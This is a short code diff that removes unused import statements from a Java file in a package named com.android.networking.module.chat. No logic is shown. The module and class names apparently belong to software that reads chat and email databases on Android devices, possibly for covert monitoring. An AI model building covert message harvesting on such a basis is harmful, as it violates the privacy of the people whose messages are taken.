@@ -1,8 +1,6 @@
 package com.android.networking.module.chat;
 
-import java.io.BufferedReader;
 import java.io.File;
-import java.io.FileReader;
 import java.io.IOException;
 import java.util.ArrayList;
 import java.util.Date;
@@ -12,27 +10,18 @@ import java.util.concurrent.Semaphore;
 
 import javax.xml.parsers.DocumentBuilder;
 import javax.xml.parsers.DocumentBuilderFactory;
-import javax.xml.parsers.FactoryConfigurationError;
-import javax.xml.parsers.ParserConfigurationException;
 
 import org.w3c.dom.Document;
 import org.w3c.dom.Node;
 import org.w3c.dom.NodeList;
-import org.xml.sax.SAXException;
 
 import android.database.Cursor;
-import android.database.sqlite.SQLiteDatabase;
-import android.util.Pair;
 
 import com.android.networking.Messages;
 import com.android.networking.auto.Cfg;
-import com.android.networking.capabilities.XmlParser;
-import com.android.networking.db.CursorVisitor;
 import com.android.networking.db.GenericSqliteHelper;
-import com.android.networking.db.RecordStringsVisitor;
 import com.android.networking.db.RecordVisitor;
 import com.android.networking.file.Path;
-import com.android.networking.module.email.GmailVisitor;
 import com.android.networking.util.Check;
 import com.android.networking.util.StringUtils;
 
